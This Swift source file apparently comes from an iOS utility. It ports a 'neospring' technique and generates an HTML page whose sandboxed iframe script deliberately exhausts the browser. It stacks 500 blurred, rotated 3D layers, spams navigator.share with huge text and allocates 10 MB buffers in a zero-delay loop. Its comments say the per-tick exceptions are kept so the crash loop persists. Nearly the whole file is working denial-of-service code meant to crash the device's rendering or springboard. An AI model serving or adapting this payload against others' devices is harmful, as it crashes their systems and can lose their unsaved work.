import Foundation

// neospring port. Preserve its browser defaults and workload behavior.
enum RespringDocument {
    static let attemptSeconds = 8
    static let preparationTimeoutSeconds = 5
    static let layerCount = 500
    static let allocationBytes = 10 * 1024 * 1024

    static func html() -> String {
        """
        <!doctype html><html><body>
        <iframe id="pressure" srcdoc="" sandbox="allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-presentation allow-scripts"></iframe>
        <script>\(hostScript())</script></body></html>
        """
    }

    static func hostScript() -> String {
        let child = "<html><body><script>\(frameScript())</script></body></html>"
        let encoded = String(decoding: try! JSONEncoder().encode(child), as: UTF8.self)
            .replacingOccurrences(of: "<", with: "\\u003c")
        return """
        const frame = document.getElementById('pressure');
        let removed = false;
        window.stopPressure = () => {
          if (removed) return;
          removed = true;
          frame.remove();
        };
        frame.srcdoc = \(encoded);
        """
    }

    static func frameScript() -> String {
        """
        const surface = document.createElement('div');
        surface.style.perspective = '1px';
        surface.style.perspectiveOrigin = '9999999% 9999999%';
        document.body.appendChild(surface);
        let stopped = false, interval = 0;
        const stop = () => {
          if (stopped) return;
          stopped = true;
          clearInterval(interval);
          surface.remove();
        };
        setTimeout(stop, \(attemptSeconds * 1000));
        for (let depth = 0; depth < \(layerCount); depth++) {
          const plane = document.createElement('div');
          Object.assign(plane.style, {
            position: 'absolute', width: '100vw', height: '100vh',
            backdropFilter: 'blur(100px)', webkitBackdropFilter: 'blur(100px)',
            transform: `translate3d(100000px, 100000px, ${depth}px) rotateY(90deg)`
          });
          surface.appendChild(plane);
        }
        interval = setInterval(() => {
          if (stopped) return;
          navigator.share({title: 'R', text: 'R'.repeat(100000)}).catch(() => {});
          const transient = new Uint8Array(\(allocationBytes));
          // Intentionally preserve upstream's full-buffer call and uncaught
          // per-tick exception. QuotaExceededError does not cancel setInterval.
          crypto.getRandomValues(transient);
        }, 0);
        window.addEventListener('pagehide', stop);
        """
    }
}
